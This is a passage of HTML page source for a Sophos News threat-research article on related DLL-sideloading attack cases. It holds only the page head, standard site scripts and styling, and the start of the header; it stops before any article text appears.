<!DOCTYPE html>
<html lang="en-US">
<head>
<meta charset="UTF-8">
<meta http-equiv="x-ua-compatible" content="ie=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="profile" href="http://gmpg.org/xfn/11">
<link rel="pingback" href="https://news.sophos.com/xmlrpc.php">
	<link rel="alternate" hreflang="es-419" href="https://news.sophos.com/es-419/2022/11/03/family-tree-dll-sideloading-cases-may-be-related" />
	<link rel="alternate" hreflang="nl-nl" href="https://news.sophos.com/nl-nl/2022/11/03/family-tree-dll-sideloading-cases-may-be-related" />
	<link rel="alternate" hreflang="pt-br" href="https://news.sophos.com/pt-br/2022/11/03/family-tree-dll-sideloading-cases-may-be-related" />
	<link rel="alternate" hreflang="de-de" href="https://news.sophos.com/de-de/2022/11/03/family-tree-dll-sideloading-cases-may-be-related" />
	<link rel="alternate" hreflang="en-us" href="https://news.sophos.com/en-us/2022/11/03/family-tree-dll-sideloading-cases-may-be-related" />
	<link rel="alternate" hreflang="fr-fr" href="https://news.sophos.com/fr-fr/2022/11/03/family-tree-dll-sideloading-cases-may-be-related" />
	<link rel="alternate" hreflang="es-es" href="https://news.sophos.com/es-es/2022/11/03/family-tree-dll-sideloading-cases-may-be-related" />
	<link rel="alternate" hreflang="it-it" href="https://news.sophos.com/it-it/2022/11/03/family-tree-dll-sideloading-cases-may-be-related" />
	<link rel="alternate" hreflang="ja-jp" href="https://news.sophos.com/ja-jp/2022/11/03/family-tree-dll-sideloading-cases-may-be-related" />
	<link rel="alternate" hreflang="zh-tw" href="https://news.sophos.com/zh-tw/2022/11/03/family-tree-dll-sideloading-cases-may-be-related" />
<!-- Google Tag Manager -->
<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-TW8W88B');</script>
<!-- End Google Tag Manager -->
<script type="text/javascript">
/* <![CDATA[ */
(()=>{var e={};e.g=function(){if("object"==typeof globalThis)return globalThis;try{return this||new Function("return this")()}catch(e){if("object"==typeof window)return window}}(),function({ampUrl:n,isCustomizePreview:t,isAmpDevMode:r,noampQueryVarName:o,noampQueryVarValue:s,disabledStorageKey:i,mobileUserAgents:a,regexRegex:c}){if("undefined"==typeof sessionStorage)return;const d=new RegExp(c);if(!a.some((e=>{const n=e.match(d);return!(!n||!new RegExp(n[1],n[2]).test(navigator.userAgent))||navigator.userAgent.includes(e)})))return;e.g.addEventListener("DOMContentLoaded",(()=>{const e=document.getElementById("amp-mobile-version-switcher");if(!e)return;e.hidden=!1;const n=e.querySelector("a[href]");n&&n.addEventListener("click",(()=>{sessionStorage.removeItem(i)}))}));const g=r&&["paired-browsing-non-amp","paired-browsing-amp"].includes(window.name);if(sessionStorage.getItem(i)||t||g)return;const u=new URL(location.href),m=new URL(n);m.hash=u.hash,u.searchParams.has(o)&&s===u.searchParams.get(o)?sessionStorage.setItem(i,"1"):m.href!==u.href&&(window.stop(),location.replace(m.href))}({"ampUrl":"https:\/\/news.sophos.com\/en-us\/2022\/11\/03\/family-tree-dll-sideloading-cases-may-be-related\/?amp=1","noampQueryVarName":"noamp","noampQueryVarValue":"mobile","disabledStorageKey":"amp_mobile_redirect_disabled","mobileUserAgents":["Mobile","Android","Silk\/","Kindle","BlackBerry","Opera Mini","Opera Mobi"],"regexRegex":"^\\\/((?:.|\\n)+)\\\/([i]*)$","isCustomizePreview":false,"isAmpDevMode":false})})();
/* ]]> */
</script>
<title>Family Tree: DLL-Sideloading Cases May Be Related &#8211; Sophos News</title>
<meta name='robots' content='max-image-preview:large' />
	<style>img:is([sizes="auto" i], [sizes^="auto," i]) { contain-intrinsic-size: 3000px 1500px }</style>
	<!-- Jetpack Site Verification Tags -->
<meta name="google-site-verification" content="8r1qg681OjOolfxmHEY1IYupmTBdyKXc-OPfpgeQHFk" />
<link rel='dns-prefetch' href='//unpkg.com' />
<link rel='dns-prefetch' href='//stats.wp.com' />
<link rel='dns-prefetch' href='//v0.wordpress.com' />
<link rel="alternate" type="application/rss+xml" title="Sophos News &raquo; Feed" href="https://news.sophos.com/feed/" />
<link rel="alternate" type="application/rss+xml" title="Sophos News &raquo; Comments Feed" href="https://news.sophos.com/comments/feed/" />
<script type="text/javascript">
/* <![CDATA[ */
window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/news.sophos.com\/wp-includes\/js\/wp-emoji-release.min.js?ver=6.7.1"}};
/*! This file is auto-generated */
!function(i,n){var o,s,e;function c(e){try{var t={supportTests:e,timestamp:(new Date).valueOf()};sessionStorage.setItem(o,JSON.stringify(t))}catch(e){}}function p(e,t,n){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);var t=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data),r=(e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(n,0,0),new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data));return t.every(function(e,t){return e===r[t]})}function u(e,t,n){switch(t){case"flag":return n(e,"\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f","\ud83c\udff3\ufe0f\u200b\u26a7\ufe0f")?!1:!n(e,"\ud83c\uddfa\ud83c\uddf3","\ud83c\uddfa\u200b\ud83c\uddf3")&&!n(e,"\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f","\ud83c\udff4\u200b\udb40\udc67\u200b\udb40\udc62\u200b\udb40\udc65\u200b\udb40\udc6e\u200b\udb40\udc67\u200b\udb40\udc7f");case"emoji":return!n(e,"\ud83d\udc26\u200d\u2b1b","\ud83d\udc26\u200b\u2b1b")}return!1}function f(e,t,n){var r="undefined"!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?new OffscreenCanvas(300,150):i.createElement("canvas"),a=r.getContext("2d",{willReadFrequently:!0}),o=(a.textBaseline="top",a.font="600 32px Arial",{});return e.forEach(function(e){o[e]=t(a,e,n)}),o}function t(e){var t=i.createElement("script");t.src=e,t.defer=!0,i.head.appendChild(t)}"undefined"!=typeof Promise&&(o="wpEmojiSettingsSupports",s=["flag","emoji"],n.supports={everything:!0,everythingExceptFlag:!0},e=new Promise(function(e){i.addEventListener("DOMContentLoaded",e,{once:!0})}),new Promise(function(t){var n=function(){try{var e=JSON.parse(sessionStorage.getItem(o));if("object"==typeof e&&"number"==typeof e.timestamp&&(new Date).valueOf()<e.timestamp+604800&&"object"==typeof e.supportTests)return e.supportTests}catch(e){}return null}();if(!n){if("undefined"!=typeof Worker&&"undefined"!=typeof OffscreenCanvas&&"undefined"!=typeof URL&&URL.createObjectURL&&"undefined"!=typeof Blob)try{var e="postMessage("+f.toString()+"("+[JSON.stringify(s),u.toString(),p.toString()].join(",")+"));",r=new Blob([e],{type:"text/javascript"}),a=new Worker(URL.createObjectURL(r),{name:"wpTestEmojiSupports"});return void(a.onmessage=function(e){c(n=e.data),a.terminate(),t(n)})}catch(e){}c(n=f(s,u,p))}t(n)}).then(function(e){for(var t in e)n.supports[t]=e[t],n.supports.everything=n.supports.everything&&n.supports[t],"flag"!==t&&(n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&n.supports[t]);n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&!n.supports.flag,n.DOMReady=!1,n.readyCallback=function(){n.DOMReady=!0}}).then(function(){return e}).then(function(){var e;n.supports.everything||(n.readyCallback(),(e=n.source||{}).concatemoji?t(e.concatemoji):e.wpemoji&&e.twemoji&&(t(e.twemoji),t(e.wpemoji)))}))}((window,document),window._wpemojiSettings);
/* ]]> */
</script>
<style id='wp-emoji-styles-inline-css'>

	img.wp-smiley, img.emoji {
		display: inline !important;
		border: none !important;
		box-shadow: none !important;
		height: 1em !important;
		width: 1em !important;
		margin: 0 0.07em !important;
		vertical-align: -0.1em !important;
		background: none !important;
		padding: 0 !important;
	}
</style>
<link rel='stylesheet' id='all-css-2' href='https://news.sophos.com/wp-includes/css/dist/block-library/style.min.css?m=1732206022g' type='text/css' media='all' />
<style id='safe-svg-svg-icon-style-inline-css'>
.safe-svg-cover{text-align:center}.safe-svg-cover .safe-svg-inside{display:inline-block;max-width:100%}.safe-svg-cover svg{height:100%;max-height:100%;max-width:100%;width:100%}

</style>
<link rel='stylesheet' id='all-css-6' href='https://news.sophos.com/_static/??-eJzTLy/QzcxLzilNSS3WzyrWz01NyUxMzUnNTc0rQeEU5CRWphbp5qSmJyZX6uVm5uklFxfr6OPTDpRD5sM02efaGpobGxkZmBkYGQMARIMu1Q==' type='text/css' media='all' />
<style id='jetpack-sharing-buttons-style-inline-css'>
.jetpack-sharing-buttons__services-list{display:flex;flex-direction:row;flex-wrap:wrap;gap:0;list-style-type:none;margin:5px;padding:0}.jetpack-sharing-buttons__services-list.has-small-icon-size{font-size:12px}.jetpack-sharing-buttons__services-list.has-normal-icon-size{font-size:16px}.jetpack-sharing-buttons__services-list.has-large-icon-size{font-size:24px}.jetpack-sharing-buttons__services-list.has-huge-icon-size{font-size:36px}@media print{.jetpack-sharing-buttons__services-list{display:none!important}}.editor-styles-wrapper .wp-block-jetpack-sharing-buttons{gap:0;padding-inline-start:0}ul.jetpack-sharing-buttons__services-list.has-background{padding:1.25em 2.375em}
</style>
<style id='co-authors-plus-coauthors-style-inline-css'>
.wp-block-co-authors-plus-coauthors.is-layout-flow [class*=wp-block-co-authors-plus]{display:inline}

</style>
<style id='co-authors-plus-avatar-style-inline-css'>
.wp-block-co-authors-plus-avatar :where(img){height:auto;max-width:100%;vertical-align:bottom}.wp-block-co-authors-plus-coauthors.is-layout-flow .wp-block-co-authors-plus-avatar :where(img){vertical-align:middle}.wp-block-co-authors-plus-avatar:is(.alignleft,.alignright){display:table}.wp-block-co-authors-plus-avatar.aligncenter{display:table;margin-inline:auto}

</style>
<style id='co-authors-plus-image-style-inline-css'>
.wp-block-co-authors-plus-image{margin-bottom:0}.wp-block-co-authors-plus-image :where(img){height:auto;max-width:100%;vertical-align:bottom}.wp-block-co-authors-plus-coauthors.is-layout-flow .wp-block-co-authors-plus-image :where(img){vertical-align:middle}.wp-block-co-authors-plus-image:is(.alignfull,.alignwide) :where(img){width:100%}.wp-block-co-authors-plus-image:is(.alignleft,.alignright){display:table}.wp-block-co-authors-plus-image.aligncenter{display:table;margin-inline:auto}

</style>
<style id='elasticpress-facet-style-inline-css'>
.widget_ep-facet input[type=search],.wp-block-elasticpress-facet input[type=search]{margin-bottom:1rem}.widget_ep-facet .searchable .inner,.wp-block-elasticpress-facet .searchable .inner{max-height:20em;overflow:scroll}.widget_ep-facet .term.hide,.wp-block-elasticpress-facet .term.hide{display:none}.widget_ep-facet .empty-term,.wp-block-elasticpress-facet .empty-term{opacity:.5;position:relative}.widget_ep-facet .empty-term:after,.wp-block-elasticpress-facet .empty-term:after{bottom:0;content:" ";display:block;left:0;position:absolute;right:0;top:0;width:100%;z-index:2}.widget_ep-facet .level-1,.wp-block-elasticpress-facet .level-1{padding-left:20px}.widget_ep-facet .level-2,.wp-block-elasticpress-facet .level-2{padding-left:40px}.widget_ep-facet .level-3,.wp-block-elasticpress-facet .level-3{padding-left:60px}.widget_ep-facet .level-4,.wp-block-elasticpress-facet .level-4{padding-left:5pc}.widget_ep-facet .level-5,.wp-block-elasticpress-facet .level-5{padding-left:75pt}.widget_ep-facet input[disabled],.wp-block-elasticpress-facet input[disabled]{cursor:pointer;opacity:1}.widget_ep-facet .term a,.wp-block-elasticpress-facet .term a{-webkit-box-align:center;-ms-flex-align:center;align-items:center;display:-webkit-box;display:-ms-flexbox;display:flex;position:relative}.widget_ep-facet .term a:hover .ep-checkbox,.wp-block-elasticpress-facet .term a:hover .ep-checkbox{background-color:#ccc}.ep-checkbox{-webkit-box-align:center;-ms-flex-align:center;-ms-flex-negative:0;-webkit-box-pack:center;-ms-flex-pack:center;align-items:center;background-color:#eee;display:-webkit-box;display:-ms-flexbox;display:flex;flex-shrink:0;height:1em;justify-content:center;margin-right:.25em;width:1em}.ep-checkbox:after{border:solid #fff;border-width:0 .125em .125em 0;content:"";display:none;height:.5em;-webkit-transform:rotate(45deg);transform:rotate(45deg);width:.25em}.ep-checkbox.checked{background-color:#5e5e5e}.ep-checkbox.checked:after{display:block}

</style>
<link rel='stylesheet' id='all-css-18' href='https://news.sophos.com/wp-content/mu-plugins/search/elasticpress/dist/css/related-posts-block-styles.min.css?m=1730999764g' type='text/css' media='all' />
<style id='classic-theme-styles-inline-css'>
/*! This file is auto-generated */
.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}
</style>
<style id='global-styles-inline-css'>
:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}
:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}
:root :where(.wp-block-pullquote){font-size: 1.5em;line-height: 1.6;}
</style>
<link rel='stylesheet' id='all-css-22' href='https://news.sophos.com/wp-content/themes/sophosnews-2017/style-2021.css?m=1722941894g' type='text/css' media='all' />
<script type="text/javascript" src="https://news.sophos.com/_static/??-eJzTLy/QzcxLzilNSS3WzwKiwtLUokoopZebmaeXVayjj0+Rbm5melFiSSpUsX2uraG5sZGRgZmBkXEWAK8tIhI=" ></script><link rel="https://api.w.org/" href="https://news.sophos.com/wp-json/" /><link rel="alternate" title="JSON" type="application/json" href="https://news.sophos.com/wp-json/wp/v2/posts/87792" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://news.sophos.com/xmlrpc.php?rsd" />
<meta name="generator" content="WordPress 6.7.1" />
<link rel="canonical" href="https://news.sophos.com/en-us/2022/11/03/family-tree-dll-sideloading-cases-may-be-related/" />
<link rel='shortlink' href='https://news.sophos.com/?p=87792' />
<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="https://news.sophos.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fnews.sophos.com%2Fen-us%2F2022%2F11%2F03%2Ffamily-tree-dll-sideloading-cases-may-be-related%2F" />
<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="https://news.sophos.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fnews.sophos.com%2Fen-us%2F2022%2F11%2F03%2Ffamily-tree-dll-sideloading-cases-may-be-related%2F&#038;format=xml" />
<link rel="me" href="https://infosec.exchange/@SophosXOps"/>
<link rel="alternate" type="text/html" media="only screen and (max-width: 640px)" href="https://news.sophos.com/en-us/2022/11/03/family-tree-dll-sideloading-cases-may-be-related/?amp=1">	<style>img#wpstats{display:none}</style>
		<link rel="amphtml" href="https://news.sophos.com/en-us/2022/11/03/family-tree-dll-sideloading-cases-may-be-related/?amp=1"><style>#amp-mobile-version-switcher{left:0;position:absolute;width:100%;z-index:100}#amp-mobile-version-switcher>a{background-color:#444;border:0;color:#eaeaea;display:block;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen-Sans,Ubuntu,Cantarell,Helvetica Neue,sans-serif;font-size:16px;font-weight:600;padding:15px 0;text-align:center;-webkit-text-decoration:none;text-decoration:none}#amp-mobile-version-switcher>a:active,#amp-mobile-version-switcher>a:focus,#amp-mobile-version-switcher>a:hover{-webkit-text-decoration:underline;text-decoration:underline}</style>
<!-- Jetpack Open Graph Tags -->
<meta property="og:type" content="article" />
<meta property="og:title" content="Family Tree: DLL-Sideloading Cases May Be Related" />
<meta property="og:url" content="https://news.sophos.com/en-us/2022/11/03/family-tree-dll-sideloading-cases-may-be-related/" />
<meta property="og:description" content="A threat actor’s repeated use of DLL-hijack execution flow makes for interesting attack results, including omnivorous file ingestion; we break down five cases and find commonalities" />
<meta property="article:published_time" content="2022-11-03T12:03:13+00:00" />
<meta property="article:modified_time" content="2022-11-18T15:14:47+00:00" />
<meta property="og:site_name" content="Sophos News" />
<meta property="og:image" content="https://news.sophos.com/wp-content/uploads/2022/11/shutterstock_188747756.jpg?w=640" />
<meta property="og:image:secure_url" content="https://news.sophos.com/wp-content/uploads/2022/11/shutterstock_188747756.jpg?w=640" />
<meta property="og:image:width" content="640" />
<meta property="og:image:height" content="425" />
<meta property="og:image:alt" content="" />
<meta property="og:locale" content="en_US" />
<meta property="fb:admins" content="28552295016" />
<meta name="twitter:text:title" content="Family Tree: DLL-Sideloading Cases May Be Related" />
<meta name="twitter:image" content="https://news.sophos.com/wp-content/uploads/2022/11/shutterstock_188747756.jpg?w=640" />
<meta name="twitter:card" content="summary_large_image" />

<!-- End Jetpack Open Graph Tags -->
<link rel="icon" href="https://news.sophos.com/wp-content/uploads/2020/01/cropped-sophos.png?w=32" sizes="32x32" />
<link rel="icon" href="https://news.sophos.com/wp-content/uploads/2020/01/cropped-sophos.png?w=192" sizes="192x192" />
<link rel="apple-touch-icon" href="https://news.sophos.com/wp-content/uploads/2020/01/cropped-sophos.png?w=180" />
<meta name="msapplication-TileImage" content="https://news.sophos.com/wp-content/uploads/2020/01/cropped-sophos.png?w=270" />
		<style type="text/css" id="wp-custom-css">
			.entry-content .embed-vimeo iframe,
.entry-content .embed-youtube iframe {
  aspect-ratio: 16/9; width: 100%; height: auto;
}		</style>
		</head>

<body class="post-template-default single single-post postid-87792 single-format-standard group-blog">
<!-- Google Tag Manager (noscript) -->
<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-TW8W88B"
height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
<!-- End Google Tag Manager (noscript) -->
<div id="page" class="hfeed site">
	<a class="sr-only" href="#content">Skip to content</a>

	
<header class="bg-blue-600" x-data="{ mobileMenu: false, searchField: false }">
	<div class="container">
		<div class="flex items-center justify-between h-16">

			<!-- Logo -->
			<div class="flex-shrink-0">
				<a class="site-logo" href="https://news.sophos.com/en-us/" rel="home">
				<svg width="172" height="17" xmlns="http://www.w3.org/2000/svg">
					<g fill="#FFF" fill-rule="evenodd">
						<path d="M113.024 5.298V16.74h-2.595V.259h2.265l7.997 11.49V.26h2.619v16.482h-2.289l-7.997-11.443M126.064.259h10.78v2.307H128.8v4.521h7.549v2.214h-7.55v5.133h8.376v2.307h-11.111V.259M138.478.259h2.855l2.694 12.29L147.29.26h2.783l3.61 12.314L156.005.26h2.783l-3.62 16.482h-2.76l-3.751-12.126-3.426 12.126h-2.784L138.478.259M168.933 4.968v-.283c0-1.318-.778-2.425-3.492-2.425-2.43 0-3.279 1.013-3.279 2.284 0 1.201.708 1.743 2.218 2.073l3.491.776c2.123.448 4.129 1.602 4.129 4.333 0 3.014-1.675 5.274-6.204 5.274-5.214 0-6.559-2.26-6.559-4.52v-.307h2.737v.26c0 1.2.755 2.284 3.774 2.284 2.5 0 3.421-1.084 3.421-2.638 0-1.224-.731-1.907-2.289-2.237l-3.49-.777c-2.407-.517-3.917-1.742-3.917-4.309 0-2.566 1.77-4.756 6.016-4.756 4.553 0 6.18 2.26 6.18 4.639v.33h-2.736M85.303 16.718h8.88c2.492 0 3.549-.15 4.379-.677 1.308-.803 2.139-2.378 2.139-4.162 0-1.457-.504-2.868-1.258-3.622-.981-1.006-2.316-1.382-4.783-1.382h-2.693c-1.208 0-2.097-.05-2.6-.276-.605-.277-.956-.81-.956-1.562 0-.88.427-1.455 1.132-1.632.529-.124 1.14-.124 2.726-.15h7.949V.265h-8.754c-1.963 0-2.843.075-3.598.353-1.737.602-2.921 2.383-2.921 4.518 0 1.458.58 2.745 1.587 3.624.881.753 2.189 1.105 4.202 1.105h3.584c.805 0 1.46.1 1.813.3.678.327 1.08.934 1.08 1.714 0 .652-.301 1.122-.83 1.447-.426.278-1.158.403-2.49.403h-8.588v2.99zm-84.945 0h8.88c2.492 0 3.549-.15 4.38-.677 1.307-.803 2.138-2.378 2.138-4.162 0-1.457-.504-2.868-1.258-3.622-.982-1.006-2.316-1.382-4.783-1.382H7.023c-1.209 0-2.098-.05-2.6-.276-.605-.277-.957-.81-.957-1.562 0-.88.427-1.455 1.132-1.632.53-.124 1.141-.124 2.726-.15h7.95V.265H6.52c-1.964 0-2.844.075-3.6.353C1.185 1.22 0 3 0 5.136 0 6.594.582 7.881 1.587 8.76c.881.753 2.19 1.105 4.203 1.105h3.582c.807 0 1.46.1 1.814.3.678.327 1.08.934 1.08 1.714 0 .652-.3 1.122-.83 1.447-.426.278-1.157.403-2.49.403H.358v2.99zM71.99 4.596c-.52.813-.765 2.118-.765 3.87 0 3.845 1.331 5.595 4.294 5.595 2.915 0 4.248-1.75 4.248-5.546 0-3.847-1.308-5.571-4.248-5.571-1.604 0-2.864.592-3.53 1.652zm10.05-1.897c1.013 1.33 1.58 3.498 1.58 6.039 0 2.882-.914 5.249-2.544 6.555-1.233.986-3.11 1.528-5.335 1.528-3.16 